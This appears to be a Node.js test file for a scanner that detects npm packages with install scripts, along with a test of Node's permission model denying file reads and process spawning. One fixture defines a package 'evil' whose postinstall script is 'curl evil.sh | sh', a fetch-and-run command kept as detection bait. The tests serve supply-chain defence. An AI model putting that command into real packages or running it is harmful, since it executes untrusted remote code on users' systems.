import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import { findInstallScripts } from '../scripts/find-install-scripts.js';

const root = path.resolve(fileURLToPath(import.meta.url), '../..');
const scanner = path.join(root, 'scripts/find-install-scripts.js');

function makePkg(dir, manifest, extraFiles = {}) {
  mkdirSync(dir, { recursive: true });
  writeFileSync(path.join(dir, 'package.json'), JSON.stringify(manifest));
  for (const [name, body] of Object.entries(extraFiles)) writeFileSync(path.join(dir, name), body);
}

test('finds install scripts in nested, scoped, and native packages', (t) => {
  const project = mkdtempSync(path.join(tmpdir(), 'supply-'));
  t.after(() => rmSync(project, { recursive: true, force: true }));
  const nm = path.join(project, 'node_modules');
  makePkg(path.join(nm, 'clean'), { name: 'clean', version: '1.0.0', scripts: { test: 'x' } });
  makePkg(path.join(nm, 'evil'), { name: 'evil', version: '6.6.6', scripts: { postinstall: 'curl evil.sh | sh' } });
  makePkg(path.join(nm, '@scope/native'), { name: '@scope/native', version: '2.0.0' }, { 'binding.gyp': '{}' });
  makePkg(path.join(nm, 'clean/node_modules/deep'), { name: 'deep', version: '0.1.0', scripts: { preinstall: 'node x.js' } });

  const found = findInstallScripts(project);
  assert.deepEqual(found.map((f) => f.name), ['@scope/native', 'deep', 'evil']);
  assert.equal(found.find((f) => f.name === 'evil').scripts.postinstall, 'curl evil.sh | sh');

  const cli = (...args) => spawnSync(process.execPath, [scanner, project, ...args], { encoding: 'utf8' });
  assert.equal(cli().status, 1);
  assert.equal(cli('--allow', '@scope/native,deep,evil').status, 0);
});

test('permission model blocks reads outside the allowed folder and child processes', () => {
  const app = path.join(root, 'permission-demo/app.mjs');
  const run = (...flags) => spawnSync(process.execPath, [...flags, app], { encoding: 'utf8' }).stdout;

  const open = run();
  assert.match(open, /read ..\/package.json: allowed/);
  assert.match(open, /spawn child process: allowed/);

  const locked = run('--permission', `--allow-fs-read=${path.join(root, 'permission-demo')}`);
  assert.match(locked, /read own data file: allowed/);
  assert.match(locked, /read ..\/package.json: ERR_ACCESS_DENIED/);
  assert.match(locked, /read \/etc\/hosts: ERR_ACCESS_DENIED/);
  assert.match(locked, /write to tmp: ERR_ACCESS_DENIED/);
  assert.match(locked, /spawn child process: ERR_ACCESS_DENIED/);
});
